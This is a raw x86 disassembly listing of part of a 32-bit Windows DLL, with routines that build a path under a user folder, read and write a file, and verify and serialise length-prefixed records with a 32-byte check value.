1000857e:	50                   	push   %eax
1000857f:	e8 8c 57 00 00       	call   0x1000dd10
10008584:	33 c0                	xor    %eax,%eax
10008586:	83 c4 0c             	add    $0xc,%esp
10008589:	40                   	inc    %eax
1000858a:	5f                   	pop    %edi
1000858b:	5e                   	pop    %esi
1000858c:	5d                   	pop    %ebp
1000858d:	c3                   	ret    
1000858e:	8b 00                	mov    (%eax),%eax
10008590:	c3                   	ret    
10008591:	55                   	push   %ebp
10008592:	8b ec                	mov    %esp,%ebp
10008594:	0f b7 4a 04          	movzwl 0x4(%edx),%ecx
10008598:	56                   	push   %esi
10008599:	8d 71 02             	lea    0x2(%ecx),%esi
1000859c:	b8 f8 ff 00 00       	mov    $0xfff8,%eax
100085a1:	3b f0                	cmp    %eax,%esi
100085a3:	76 04                	jbe    0x100085a9
100085a5:	33 c0                	xor    %eax,%eax
100085a7:	eb 28                	jmp    0x100085d1
100085a9:	8d 4c 11 06          	lea    0x6(%ecx,%edx,1),%ecx
100085ad:	0f b7 11             	movzwl (%ecx),%edx
100085b0:	3b d0                	cmp    %eax,%edx
100085b2:	77 f1                	ja     0x100085a5
100085b4:	8d 4c 11 02          	lea    0x2(%ecx,%edx,1),%ecx
100085b8:	0f b7 31             	movzwl (%ecx),%esi
100085bb:	3b f0                	cmp    %eax,%esi
100085bd:	77 e6                	ja     0x100085a5
100085bf:	56                   	push   %esi
100085c0:	83 c1 02             	add    $0x2,%ecx
100085c3:	51                   	push   %ecx
100085c4:	ff 75 08             	pushl  0x8(%ebp)
100085c7:	e8 44 57 00 00       	call   0x1000dd10
100085cc:	83 c4 0c             	add    $0xc,%esp
100085cf:	8b c6                	mov    %esi,%eax
100085d1:	5e                   	pop    %esi
100085d2:	5d                   	pop    %ebp
100085d3:	c3                   	ret    
100085d4:	56                   	push   %esi
100085d5:	6a 00                	push   $0x0
100085d7:	6a 00                	push   $0x0
100085d9:	6a 1a                	push   $0x1a
100085db:	6a 00                	push   $0x0
100085dd:	ff 15 84 e1 00 10    	call   *0x1000e184
100085e3:	68 dc eb 00 10       	push   $0x1000ebdc
100085e8:	56                   	push   %esi
100085e9:	ff 15 90 e1 00 10    	call   *0x1000e190
100085ef:	85 c0                	test   %eax,%eax
100085f1:	74 0c                	je     0x100085ff
100085f3:	68 ec eb 00 10       	push   $0x1000ebec
100085f8:	50                   	push   %eax
100085f9:	ff 15 c4 e0 00 10    	call   *0x1000e0c4
100085ff:	68 f8 eb 00 10       	push   $0x1000ebf8
10008604:	56                   	push   %esi
10008605:	ff 15 cc e0 00 10    	call   *0x1000e0cc
1000860b:	56                   	push   %esi
1000860c:	ff 15 6c e0 00 10    	call   *0x1000e06c
10008612:	8d 04 46             	lea    (%esi,%eax,2),%eax
10008615:	89 86 d0 02 00 00    	mov    %eax,0x2d0(%esi)
1000861b:	8b c6                	mov    %esi,%eax
1000861d:	c3                   	ret    
1000861e:	56                   	push   %esi
1000861f:	8b f0                	mov    %eax,%esi
10008621:	e8 2e 04 00 00       	call   0x10008a54
10008626:	89 46 04             	mov    %eax,0x4(%esi)
10008629:	8b c6                	mov    %esi,%eax
1000862b:	5e                   	pop    %esi
1000862c:	c3                   	ret    
1000862d:	83 c0 08             	add    $0x8,%eax
10008630:	50                   	push   %eax
10008631:	ff 15 68 e1 00 10    	call   *0x1000e168
10008637:	c3                   	ret    
10008638:	55                   	push   %ebp
10008639:	8b ec                	mov    %esp,%ebp
1000863b:	81 ec dc 02 00 00    	sub    $0x2dc,%esp
10008641:	56                   	push   %esi
10008642:	8d b5 28 fd ff ff    	lea    -0x2d8(%ebp),%esi
10008648:	e8 87 ff ff ff       	call   0x100085d4
1000864d:	68 fc eb 00 10       	push   $0x1000ebfc
10008652:	8b c6                	mov    %esi,%eax
10008654:	50                   	push   %eax
10008655:	ff 15 cc e0 00 10    	call   *0x1000e0cc
1000865b:	8b c7                	mov    %edi,%eax
1000865d:	33 f6                	xor    %esi,%esi
1000865f:	e8 f4 05 00 00       	call   0x10008c58
10008664:	85 c0                	test   %eax,%eax
10008666:	74 18                	je     0x10008680
10008668:	8d 85 28 fd ff ff    	lea    -0x2d8(%ebp),%eax
1000866e:	50                   	push   %eax
1000866f:	57                   	push   %edi
10008670:	89 37                	mov    %esi,(%edi)
10008672:	e8 2d 01 00 00       	call   0x100087a4
10008677:	8b f0                	mov    %eax,%esi
10008679:	8b c7                	mov    %edi,%eax
1000867b:	e8 e6 05 00 00       	call   0x10008c66
10008680:	8b c6                	mov    %esi,%eax
10008682:	c7 07 01 00 00 00    	movl   $0x1,(%edi)
10008688:	5e                   	pop    %esi
10008689:	c9                   	leave  
1000868a:	c3                   	ret    
1000868b:	c3                   	ret    
1000868c:	55                   	push   %ebp
1000868d:	8b ec                	mov    %esp,%ebp
1000868f:	51                   	push   %ecx
10008690:	51                   	push   %ecx
10008691:	56                   	push   %esi
10008692:	57                   	push   %edi
10008693:	8b f0                	mov    %eax,%esi
10008695:	33 c0                	xor    %eax,%eax
10008697:	50                   	push   %eax
10008698:	50                   	push   %eax
10008699:	bf 70 f4 00 10       	mov    $0x1000f470,%edi
1000869e:	57                   	push   %edi
1000869f:	89 45 f8             	mov    %eax,-0x8(%ebp)
100086a2:	e8 73 05 00 00       	call   0x10008c1a
100086a7:	83 f8 04             	cmp    $0x4,%eax
100086aa:	75 37                	jne    0x100086e3
100086ac:	50                   	push   %eax
100086ad:	e8 32 e3 ff ff       	call   0x100069e4
100086b2:	59                   	pop    %ecx
100086b3:	89 45 fc             	mov    %eax,-0x4(%ebp)
100086b6:	85 c0                	test   %eax,%eax
100086b8:	74 29                	je     0x100086e3
100086ba:	6a 04                	push   $0x4
100086bc:	50                   	push   %eax
100086bd:	57                   	push   %edi
100086be:	e8 57 05 00 00       	call   0x10008c1a
100086c3:	83 f8 04             	cmp    $0x4,%eax
100086c6:	75 12                	jne    0x100086da
100086c8:	8b 4d fc             	mov    -0x4(%ebp),%ecx
100086cb:	50                   	push   %eax
100086cc:	b8 80 f4 00 10       	mov    $0x1000f480,%eax
100086d1:	e8 c0 ce ff ff       	call   0x10005596
100086d6:	59                   	pop    %ecx
100086d7:	89 45 f8             	mov    %eax,-0x8(%ebp)
100086da:	ff 75 fc             	pushl  -0x4(%ebp)
100086dd:	e8 31 e3 ff ff       	call   0x10006a13
100086e2:	59                   	pop    %ecx
100086e3:	8b 45 f8             	mov    -0x8(%ebp),%eax
100086e6:	5f                   	pop    %edi
100086e7:	5e                   	pop    %esi
100086e8:	c9                   	leave  
100086e9:	c3                   	ret    
100086ea:	55                   	push   %ebp
100086eb:	8b ec                	mov    %esp,%ebp
100086ed:	83 ec 30             	sub    $0x30,%esp
100086f0:	53                   	push   %ebx
100086f1:	56                   	push   %esi
100086f2:	57                   	push   %edi
100086f3:	8b d9                	mov    %ecx,%ebx
100086f5:	83 f8 20             	cmp    $0x20,%eax
100086f8:	73 07                	jae    0x10008701
100086fa:	33 c0                	xor    %eax,%eax
100086fc:	e9 9c 00 00 00       	jmp    0x1000879d
10008701:	8d 70 e0             	lea    -0x20(%eax),%esi
10008704:	8d 45 d0             	lea    -0x30(%ebp),%eax
10008707:	50                   	push   %eax
10008708:	56                   	push   %esi
10008709:	53                   	push   %ebx
1000870a:	89 75 f0             	mov    %esi,-0x10(%ebp)
1000870d:	e8 e4 e8 ff ff       	call   0x10006ff6
10008712:	83 c4 0c             	add    $0xc,%esp
10008715:	6a 20                	push   $0x20
10008717:	8d 0c 1e             	lea    (%esi,%ebx,1),%ecx
1000871a:	8d 45 d0             	lea    -0x30(%ebp),%eax
1000871d:	e8 74 ce ff ff       	call   0x10005596
10008722:	59                   	pop    %ecx
10008723:	85 c0                	test   %eax,%eax
10008725:	74 d3                	je     0x100086fa
10008727:	8b 45 08             	mov    0x8(%ebp),%eax
1000872a:	83 c0 20             	add    $0x20,%eax
1000872d:	e8 9a 1a 00 00       	call   0x1000a1cc
10008732:	83 65 f4 00          	andl   $0x0,-0xc(%ebp)
10008736:	85 f6                	test   %esi,%esi
10008738:	74 60                	je     0x1000879a
1000873a:	eb 03                	jmp    0x1000873f
1000873c:	8b 75 f0             	mov    -0x10(%ebp),%esi
1000873f:	0f b7 03             	movzwl (%ebx),%eax
10008742:	83 f8 10             	cmp    $0x10,%eax
10008745:	73 b3                	jae    0x100086fa
10008747:	8b f8                	mov    %eax,%edi
10008749:	57                   	push   %edi
1000874a:	83 c3 02             	add    $0x2,%ebx
1000874d:	8d 45 e0             	lea    -0x20(%ebp),%eax
10008750:	53                   	push   %ebx
10008751:	50                   	push   %eax
10008752:	e8 b9 55 00 00       	call   0x1000dd10
10008757:	8b 4d f4             	mov    -0xc(%ebp),%ecx
1000875a:	03 df                	add    %edi,%ebx
1000875c:	c6 44 3d e0 00       	movb   $0x0,-0x20(%ebp,%edi,1)
10008761:	8b 03                	mov    (%ebx),%eax
10008763:	8d 7c 39 06          	lea    0x6(%ecx,%edi,1),%edi
10008767:	2b f7                	sub    %edi,%esi
10008769:	83 c4 0c             	add    $0xc,%esp
1000876c:	83 c3 04             	add    $0x4,%ebx
1000876f:	89 45 f8             	mov    %eax,-0x8(%ebp)
10008772:	3b c6                	cmp    %esi,%eax
10008774:	77 84                	ja     0x100086fa
10008776:	8b 75 08             	mov    0x8(%ebp),%esi
10008779:	50                   	push   %eax
1000877a:	53                   	push   %ebx
1000877b:	8d 45 e0             	lea    -0x20(%ebp),%eax
1000877e:	50                   	push   %eax
1000877f:	e8 c0 03 00 00       	call   0x10008b44
10008784:	85 c0                	test   %eax,%eax
10008786:	0f 84 6e ff ff ff    	je     0x100086fa
1000878c:	03 7d f8             	add    -0x8(%ebp),%edi
1000878f:	03 5d f8             	add    -0x8(%ebp),%ebx
10008792:	89 7d f4             	mov    %edi,-0xc(%ebp)
10008795:	3b 7d f0             	cmp    -0x10(%ebp),%edi
10008798:	72 a2                	jb     0x1000873c
1000879a:	33 c0                	xor    %eax,%eax
1000879c:	40                   	inc    %eax
1000879d:	5f                   	pop    %edi
1000879e:	5e                   	pop    %esi
1000879f:	5b                   	pop    %ebx
100087a0:	c9                   	leave  
100087a1:	c2 04 00             	ret    $0x4
100087a4:	55                   	push   %ebp
100087a5:	8b ec                	mov    %esp,%ebp
100087a7:	83 ec 0c             	sub    $0xc,%esp
100087aa:	53                   	push   %ebx
100087ab:	56                   	push   %esi
100087ac:	57                   	push   %edi
100087ad:	33 f6                	xor    %esi,%esi
100087af:	56                   	push   %esi
100087b0:	56                   	push   %esi
100087b1:	6a 03                	push   $0x3
100087b3:	56                   	push   %esi
100087b4:	56                   	push   %esi
100087b5:	68 00 00 00 80       	push   $0x80000000
100087ba:	ff 75 0c             	pushl  0xc(%ebp)
100087bd:	ff 15 70 e0 00 10    	call   *0x1000e070
100087c3:	89 45 f8             	mov    %eax,-0x8(%ebp)
100087c6:	83 f8 ff             	cmp    $0xffffffff,%eax
100087c9:	0f 84 89 00 00 00    	je     0x10008858
100087cf:	56                   	push   %esi
100087d0:	50                   	push   %eax
100087d1:	ff 15 1c e1 00 10    	call   *0x1000e11c
100087d7:	8b d8                	mov    %eax,%ebx
100087d9:	83 fb 02             	cmp    $0x2,%ebx
100087dc:	76 71                	jbe    0x1000884f
100087de:	83 fb ff             	cmp    $0xffffffff,%ebx
100087e1:	74 6c                	je     0x1000884f
100087e3:	53                   	push   %ebx
100087e4:	e8 fb e1 ff ff       	call   0x100069e4
100087e9:	59                   	pop    %ecx
100087ea:	89 45 fc             	mov    %eax,-0x4(%ebp)
100087ed:	3b c6                	cmp    %esi,%eax
100087ef:	74 5e                	je     0x1000884f
100087f1:	56                   	push   %esi
100087f2:	8d 4d 0c             	lea    0xc(%ebp),%ecx
100087f5:	51                   	push   %ecx
100087f6:	53                   	push   %ebx
100087f7:	50                   	push   %eax
100087f8:	ff 75 f8             	pushl  -0x8(%ebp)
100087fb:	89 75 0c             	mov    %esi,0xc(%ebp)
100087fe:	ff 15 74 e0 00 10    	call   *0x1000e074
10008804:	85 c0                	test   %eax,%eax
10008806:	74 3e                	je     0x10008846
10008808:	39 5d 0c             	cmp    %ebx,0xc(%ebp)
1000880b:	75 39                	jne    0x10008846
1000880d:	ff 75 0c             	pushl  0xc(%ebp)
10008810:	e8 cf e1 ff ff       	call   0x100069e4
10008815:	8b f8                	mov    %eax,%edi
10008817:	59                   	pop    %ecx
10008818:	3b fe                	cmp    %esi,%edi
1000881a:	74 2a                	je     0x10008846
1000881c:	8b 5d 0c             	mov    0xc(%ebp),%ebx
1000881f:	53                   	push   %ebx
10008820:	57                   	push   %edi
10008821:	ff 75 fc             	pushl  -0x4(%ebp)
10008824:	33 c9                	xor    %ecx,%ecx
10008826:	41                   	inc    %ecx
10008827:	e8 83 d5 ff ff       	call   0x10005daf
1000882c:	83 c4 0c             	add    $0xc,%esp
1000882f:	3b c6                	cmp    %esi,%eax
10008831:	74 0c                	je     0x1000883f
10008833:	ff 75 08             	pushl  0x8(%ebp)
10008836:	8b cf                	mov    %edi,%ecx
10008838:	e8 ad fe ff ff       	call   0x100086ea
1000883d:	8b f0                	mov    %eax,%esi
1000883f:	57                   	push   %edi
10008840:	e8 ce e1 ff ff       	call   0x10006a13
10008845:	59                   	pop    %ecx
10008846:	ff 75 fc             	pushl  -0x4(%ebp)
10008849:	e8 c5 e1 ff ff       	call   0x10006a13
1000884e:	59                   	pop    %ecx
1000884f:	ff 75 f8             	pushl  -0x8(%ebp)
10008852:	ff 15 50 e1 00 10    	call   *0x1000e150
10008858:	5f                   	pop    %edi
10008859:	8b c6                	mov    %esi,%eax
1000885b:	5e                   	pop    %esi
1000885c:	5b                   	pop    %ebx
1000885d:	c9                   	leave  
1000885e:	c2 08 00             	ret    $0x8
10008861:	55                   	push   %ebp
10008862:	8b ec                	mov    %esp,%ebp
10008864:	83 ec 2c             	sub    $0x2c,%esp
10008867:	53                   	push   %ebx
10008868:	8b d8                	mov    %eax,%ebx
1000886a:	56                   	push   %esi
1000886b:	57                   	push   %edi
1000886c:	8d 43 20             	lea    0x20(%ebx),%eax
1000886f:	e8 7e 18 00 00       	call   0x1000a0f2
10008874:	33 ff                	xor    %edi,%edi
10008876:	89 45 f8             	mov    %eax,-0x8(%ebp)
10008879:	89 7d fc             	mov    %edi,-0x4(%ebp)
1000887c:	3b c7                	cmp    %edi,%eax
1000887e:	7e 23                	jle    0x100088a3
10008880:	8b 73 20             	mov    0x20(%ebx),%esi
10008883:	0f af 75 fc          	imul   -0x4(%ebp),%esi
10008887:	03 73 24             	add    0x24(%ebx),%esi
1000888a:	56                   	push   %esi
1000888b:	ff 15 34 e1 00 10    	call   *0x1000e134
10008891:	03 46 10             	add    0x10(%esi),%eax
10008894:	ff 45 fc             	incl   -0x4(%ebp)
10008897:	8d 7c 07 27          	lea    0x27(%edi,%eax,1),%edi
1000889b:	8b 45 fc             	mov    -0x4(%ebp),%eax
1000889e:	3b 45 f8             	cmp    -0x8(%ebp),%eax
100088a1:	7c dd                	jl     0x10008880
100088a3:	57                   	push   %edi
100088a4:	e8 3b e1 ff ff       	call   0x100069e4
100088a9:	59                   	pop    %ecx
100088aa:	8b 4d 08             	mov    0x8(%ebp),%ecx
100088ad:	89 01                	mov    %eax,(%ecx)
100088af:	85 c0                	test   %eax,%eax
100088b1:	0f 84 8c 00 00 00    	je     0x10008943
100088b7:	8b 75 0c             	mov    0xc(%ebp),%esi
100088ba:	8b f8                	mov    %eax,%edi
100088bc:	33 c0                	xor    %eax,%eax
100088be:	89 06                	mov    %eax,(%esi)
100088c0:	89 45 fc             	mov    %eax,-0x4(%ebp)
100088c3:	39 45 f8             	cmp    %eax,-0x8(%ebp)
100088c6:	7e 50                	jle    0x10008918
100088c8:	8b 73 20             	mov    0x20(%ebx),%esi
100088cb:	0f af 75 fc          	imul   -0x4(%ebp),%esi
100088cf:	03 73 24             	add    0x24(%ebx),%esi
100088d2:	56                   	push   %esi
100088d3:	ff 15 34 e1 00 10    	call   *0x1000e134
100088d9:	0f b7 c0             	movzwl %ax,%eax
100088dc:	50                   	push   %eax
100088dd:	66 89 07             	mov    %ax,(%edi)
100088e0:	83 c7 02             	add    $0x2,%edi
100088e3:	56                   	push   %esi
100088e4:	57                   	push   %edi
100088e5:	89 45 f4             	mov    %eax,-0xc(%ebp)
100088e8:	e8 23 54 00 00       	call   0x1000dd10
100088ed:	03 7d f4             	add    -0xc(%ebp),%edi
100088f0:	8b 46 10             	mov    0x10(%esi),%eax
100088f3:	89 07                	mov    %eax,(%edi)
100088f5:	ff 76 10             	pushl  0x10(%esi)
100088f8:	83 c7 04             	add    $0x4,%edi
100088fb:	ff 76 14             	pushl  0x14(%esi)
100088fe:	57                   	push   %edi
100088ff:	e8 0c 54 00 00       	call   0x1000dd10
10008904:	03 7e 10             	add    0x10(%esi),%edi
10008907:	83 c4 18             	add    $0x18,%esp
1000890a:	ff 45 fc             	incl   -0x4(%ebp)
1000890d:	8b 45 fc             	mov    -0x4(%ebp),%eax
10008910:	3b 45 f8             	cmp    -0x8(%ebp),%eax
10008913:	7c b3                	jl     0x100088c8
10008915:	8b 75 0c             	mov    0xc(%ebp),%esi
10008918:	8b 45 08             	mov    0x8(%ebp),%eax
1000891b:	8b 08                	mov    (%eax),%ecx
1000891d:	8d 55 d4             	lea    -0x2c(%ebp),%edx
10008920:	8b c7                	mov    %edi,%eax
10008922:	2b c1                	sub    %ecx,%eax
10008924:	52                   	push   %edx
10008925:	50                   	push   %eax
10008926:	51                   	push   %ecx
10008927:	89 06                	mov    %eax,(%esi)
10008929:	e8 c8 e6 ff ff       	call   0x10006ff6
1000892e:	6a 20                	push   $0x20
10008930:	8d 45 d4             	lea    -0x2c(%ebp),%eax
10008933:	50                   	push   %eax
10008934:	57                   	push   %edi
10008935:	e8 d6 53 00 00       	call   0x1000dd10
1000893a:	83 06 20             	addl   $0x20,(%esi)
1000893d:	33 c0                	xor    %eax,%eax
1000893f:	83 c4 18             	add    $0x18,%esp
10008942:	40                   	inc    %eax
10008943:	5f                   	pop    %edi
10008944:	5e                   	pop    %esi
10008945:	5b                   	pop    %ebx
10008946:	c9                   	leave  
10008947:	c2 08 00             	ret    $0x8
1000894a:	55                   	push   %ebp
1000894b:	8b ec                	mov    %esp,%ebp
1000894d:	83 ec 0c             	sub    $0xc,%esp
10008950:	53                   	push   %ebx
10008951:	56                   	push   %esi
10008952:	57                   	push   %edi
10008953:	8d 45 f8             	lea    -0x8(%ebp),%eax
10008956:	50                   	push   %eax
10008957:	8d 45 fc             	lea    -0x4(%ebp),%eax
1000895a:	33 f6                	xor    %esi,%esi
1000895c:	50                   	push   %eax
1000895d:	8b 45 08             	mov    0x8(%ebp),%eax
10008960:	89 75 fc             	mov    %esi,-0x4(%ebp)
10008963:	89 75 f8             	mov    %esi,-0x8(%ebp)
10008966:	89 75 f4             	mov    %esi,-0xc(%ebp)
10008969:	e8 f3 fe ff ff       	call   0x10008861
1000896e:	85 c0                	test   %eax,%eax
10008970:	0f 84 83 00 00 00    	je     0x100089f9
10008976:	8b 7d f8             	mov    -0x8(%ebp),%edi
10008979:	8d 9f 00 01 00 00    	lea    0x100(%edi),%ebx
1000897f:	53                   	push   %ebx
10008980:	e8 5f e0 ff ff       	call   0x100069e4
10008985:	59                   	pop    %ecx
10008986:	89 45 f8             	mov    %eax,-0x8(%ebp)
10008989:	3b c6                	cmp    %esi,%eax
1000898b:	74 63                	je     0x100089f0
1000898d:	53                   	push   %ebx
1000898e:	57                   	push   %edi
1000898f:	ff 75 fc             	pushl  -0x4(%ebp)
10008992:	8b f8                	mov    %eax,%edi
10008994:	e8 52 d3 ff ff       	call   0x10005ceb
10008999:	8b f8                	mov    %eax,%edi
1000899b:	83 c4 0c             	add    $0xc,%esp
1000899e:	3b fe                	cmp    %esi,%edi
100089a0:	74 45                	je     0x100089e7
100089a2:	56                   	push   %esi
100089a3:	56                   	push   %esi
100089a4:	6a 02                	push   $0x2
100089a6:	56                   	push   %esi
100089a7:	56                   	push   %esi
100089a8:	68 00 00 00 40       	push   $0x40000000
100089ad:	ff 75 0c             	pushl  0xc(%ebp)
100089b0:	ff 15 70 e0 00 10    	call   *0x1000e070
100089b6:	8b d8                	mov    %eax,%ebx
100089b8:	83 fb ff             	cmp    $0xffffffff,%ebx
100089bb:	74 2a                	je     0x100089e7
100089bd:	56                   	push   %esi
100089be:	8d 45 08             	lea    0x8(%ebp),%eax
100089c1:	50                   	push   %eax
100089c2:	57                   	push   %edi
100089c3:	ff 75 f8             	pushl  -0x8(%ebp)
100089c6:	89 75 08             	mov    %esi,0x8(%ebp)
100089c9:	53                   	push   %ebx
100089ca:	ff 15 84 e0 00 10    	call   *0x1000e084
100089d0:	85 c0                	test   %eax,%eax
100089d2:	74 0c                	je     0x100089e0
100089d4:	39 7d 08             	cmp    %edi,0x8(%ebp)
100089d7:	75 07                	jne    0x100089e0
100089d9:	c7 45 f4 01 00 00 00 	movl   $0x1,-0xc(%ebp)
100089e0:	53                   	push   %ebx
100089e1:	ff 15 50 e1 00 10    	call   *0x1000e150
100089e7:	ff 75 f8             	pushl  -0x8(%ebp)
100089ea:	e8 24 e0 ff ff       	call   0x10006a13
100089ef:	59                   	pop    %ecx
100089f0:	ff 75 fc             	pushl  -0x4(%ebp)
100089f3:	e8 1b e0 ff ff       	call   0x10006a13
100089f8:	59                   	pop    %ecx
100089f9:	8b 45 f4             	mov    -0xc(%ebp),%eax
100089fc:	5f                   	pop    %edi
100089fd:	5e                   	pop    %esi
100089fe:	5b                   	pop    %ebx
100089ff:	c9                   	leave  
10008a00:	c2 08 00             	ret    $0x8
10008a03:	55                   	push   %ebp
10008a04:	8b ec                	mov    %esp,%ebp
10008a06:	81 ec d8 02 00 00    	sub    $0x2d8,%esp
10008a0c:	56                   	push   %esi
10008a0d:	8d b5 28 fd ff ff    	lea    -0x2d8(%ebp),%esi
10008a13:	e8 bc fb ff ff       	call   0x100085d4
10008a18:	68 fc eb 00 10       	push   $0x1000ebfc
10008a1d:	8b c6                	mov    %esi,%eax
10008a1f:	50                   	push   %eax
10008a20:	ff 15 cc e0 00 10    	call   *0x1000e0cc
10008a26:	8b 45 08             	mov    0x8(%ebp),%eax
10008a29:	33 f6                	xor    %esi,%esi
10008a2b:	e8 28 02 00 00       	call   0x10008c58
10008a30:	85 c0                	test   %eax,%eax
10008a32:	74 19                	je     0x10008a4d
10008a34:	8d 85 28 fd ff ff    	lea    -0x2d8(%ebp),%eax
10008a3a:	50                   	push   %eax
10008a3b:	ff 75 08             	pushl  0x8(%ebp)
10008a3e:	e8 07 ff ff ff       	call   0x1000894a
10008a43:	8b f0                	mov    %eax,%esi
10008a45:	8b 45 08             	mov    0x8(%ebp),%eax
10008a48:	e8 19 02 00 00       	call   0x10008c66
10008a4d:	8b c6                	mov    %esi,%eax
10008a4f:	5e                   	pop    %esi
10008a50:	c9                   	leave  
10008a51:	c2 04 00             	ret    $0x4
10008a54:	8d 46 08             	lea    0x8(%esi),%eax
10008a57:	50                   	push   %eax
10008a58:	ff 15 5c e1 00 10    	call   *0x1000e15c
10008a5e:	6a 18                	push   $0x18
10008a60:	8d 46 20             	lea    0x20(%esi),%eax
10008a63:	59                   	pop    %ecx
10008a64:	e9 37 16 00 00       	jmp    0x1000a0a0
10008a69:	55                   	push   %ebp
10008a6a:	8b ec                	mov    %esp,%ebp
10008a6c:	56                   	push   %esi
10008a6d:	57                   	push   %edi
10008a6e:	6a 00                	push   $0x0
10008a70:	6a 00                	push   $0x0
10008a72:	bf 1c ec 00 10       	mov    $0x1000ec1c,%edi
10008a77:	8b f0                	mov    %eax,%esi
10008a79:	57                   	push   %edi
10008a7a:	e8 9b 01 00 00       	call   0x10008c1a
10008a7f:	89 03                	mov    %eax,(%ebx)
10008a81:	85 c0                	test   %eax,%eax
10008a83:	74 1b                	je     0x10008aa0
10008a85:	50                   	push   %eax
10008a86:	e8 59 df ff ff       	call   0x100069e4
10008a8b:	59                   	pop    %ecx
10008a8c:	8b 4d 08             	mov    0x8(%ebp),%ecx
10008a8f:	89 01                	mov    %eax,(%ecx)
10008a91:	ff 33                	pushl  (%ebx)
10008a93:	50                   	push   %eax
10008a94:	57                   	push   %edi
10008a95:	e8 80 01 00 00       	call   0x10008c1a
10008a9a:	f7 d8                	neg    %eax
10008a9c:	1b c0                	sbb    %eax,%eax
10008a9e:	f7 d8                	neg    %eax
10008aa0:	5f                   	pop    %edi
10008aa1:	5e                   	pop    %esi
10008aa2:	5d                   	pop    %ebp
10008aa3:	c2 04 00             	ret    $0x4
10008aa6:	55                   	push   %ebp
10008aa7:	8b ec                	mov    %esp,%ebp
10008aa9:	ff 75 0c             	pushl  0xc(%ebp)
10008aac:	ff 75 08             	pushl  0x8(%ebp)
10008aaf:	68 1c ec 00 10       	push   $0x1000ec1c
10008ab4:	e8 8b 00 00 00       	call   0x10008b44
10008ab9:	5d                   	pop    %ebp
10008aba:	c2 08 00             	ret    $0x8
10008abd:	55                   	push   %ebp
10008abe:	8b ec                	mov    %esp,%ebp
10008ac0:	83 ec 1c             	sub    $0x1c,%esp
10008ac3:	56                   	push   %esi
10008ac4:	6a 18                	push   $0x18
10008ac6:	8d 45 e8             	lea    -0x18(%ebp),%eax
10008ac9:	6a 00                	push   $0x0
10008acb:	50                   	push   %eax
10008acc:	e8 59 52 00 00       	call   0x1000dd2a
10008ad1:	83 c4 0c             	add    $0xc,%esp
10008ad4:	ff 75 0c             	pushl  0xc(%ebp)
10008ad7:	ff 15 34 e1 00 10    	call   *0x1000e134
10008add:	40                   	inc    %eax
10008ade:	50                   	push   %eax
10008adf:	ff 75 0c             	pushl  0xc(%ebp)
10008ae2:	8d 45 e8             	lea    -0x18(%ebp),%eax
10008ae5:	50                   	push   %eax
10008ae6:	e8 25 52 00 00       	call   0x1000dd10
10008aeb:	8b 75 08             	mov    0x8(%ebp),%esi
10008aee:	8d 45 e8             	lea    -0x18(%ebp),%eax
10008af1:	50                   	push   %eax
10008af2:	83 c6 20             	add    $0x20,%esi
10008af5:	e8 55 16 00 00       	call   0x1000a14f
10008afa:	83 c4 10             	add    $0x10,%esp
10008afd:	5e                   	pop    %esi
10008afe:	c9                   	leave  
10008aff:	c2 08 00             	ret    $0x8
10008b02:	55                   	push   %ebp
10008b03:	8b ec                	mov    %esp,%ebp
10008b05:	56                   	push   %esi
10008b06:	8b 70 20             	mov    0x20(%eax),%esi
10008b09:	0f af 75 08          	imul   0x8(%ebp),%esi
10008b0d:	03 70 24             	add    0x24(%eax),%esi
10008b10:	8b 46 14             	mov    0x14(%esi),%eax
10008b13:	85 c0                	test   %eax,%eax
10008b15:	74 07                	je     0x10008b1e
10008b17:	50                   	push   %eax
10008b18:	e8 f6 de ff ff       	call   0x10006a13
10008b1d:	59                   	pop    %ecx
10008b1e:	57                   	push   %edi
10008b1f:	e8 c0 de ff ff       	call   0x100069e4
10008b24:	59                   	pop    %ecx
10008b25:	89 46 14             	mov    %eax,0x14(%esi)
10008b28:	85 c0                	test   %eax,%eax
10008b2a:	74 13                	je     0x10008b3f
10008b2c:	57                   	push   %edi
10008b2d:	ff 75 0c             	pushl  0xc(%ebp)
10008b30:	89 7e 10             	mov    %edi,0x10(%esi)
10008b33:	50                   	push   %eax
10008b34:	e8 d7 51 00 00       	call   0x1000dd10
10008b39:	33 c0                	xor    %eax,%eax
10008b3b:	83 c4 0c             	add    $0xc,%esp
10008b3e:	40                   	inc    %eax
10008b3f:	5e                   	pop    %esi
10008b40:	5d                   	pop    %ebp
10008b41:	c2 08 00             	ret    $0x8
10008b44:	55                   	push   %ebp
10008b45:	8b ec                	mov    %esp,%ebp
10008b47:	57                   	push   %edi
10008b48:	8b c6                	mov    %esi,%eax
10008b4a:	33 ff                	xor    %edi,%edi
10008b4c:	e8 07 01 00 00       	call   0x10008c58
10008b51:	85 c0                	test   %eax,%eax
10008b53:	74 45                	je     0x10008b9a
10008b55:	ff 75 08             	pushl  0x8(%ebp)
10008b58:	8b c6                	mov    %esi,%eax
10008b5a:	e8 42 00 00 00       	call   0x10008ba1
10008b5f:	83 f8 ff             	cmp    $0xffffffff,%eax
10008b62:	75 0e                	jne    0x10008b72
10008b64:	ff 75 08             	pushl  0x8(%ebp)
10008b67:	56                   	push   %esi
10008b68:	e8 50 ff ff ff       	call   0x10008abd
10008b6d:	83 f8 ff             	cmp    $0xffffffff,%eax
10008b70:	74 10                	je     0x10008b82
10008b72:	ff 75 0c             	pushl  0xc(%ebp)
10008b75:	8b 7d 10             	mov    0x10(%ebp),%edi
10008b78:	50                   	push   %eax
10008b79:	8b c6                	mov    %esi,%eax
10008b7b:	e8 82 ff ff ff       	call   0x10008b02
10008b80:	8b f8                	mov    %eax,%edi
10008b82:	8b c6                	mov    %esi,%eax
10008b84:	e8 dd 00 00 00       	call   0x10008c66
10008b89:	85 ff                	test   %edi,%edi
10008b8b:	74 0d                	je     0x10008b9a
10008b8d:	83 3e 00             	cmpl   $0x0,(%esi)
10008b90:	74 08                	je     0x10008b9a
10008b92:	56                   	push   %esi
10008b93:	e8 6b fe ff ff       	call   0x10008a03
10008b98:	8b f8                	mov    %eax,%edi
10008b9a:	8b c7                	mov    %edi,%eax
10008b9c:	5f                   	pop    %edi
10008b9d:	5d                   	pop    %ebp
10008b9e:	c2 0c 00             	ret    $0xc
10008ba1:	55                   	push   %ebp
10008ba2:	8b ec                	mov    %esp,%ebp
10008ba4:	53                   	push   %ebx
10008ba5:	56                   	push   %esi
10008ba6:	8b f0                	mov    %eax,%esi
10008ba8:	57                   	push   %edi
10008ba9:	8d 46 20             	lea    0x20(%esi),%eax
10008bac:	e8 41 15 00 00       	call   0x1000a0f2
10008bb1:	8b d8                	mov    %eax,%ebx
10008bb3:	33 ff                	xor    %edi,%edi
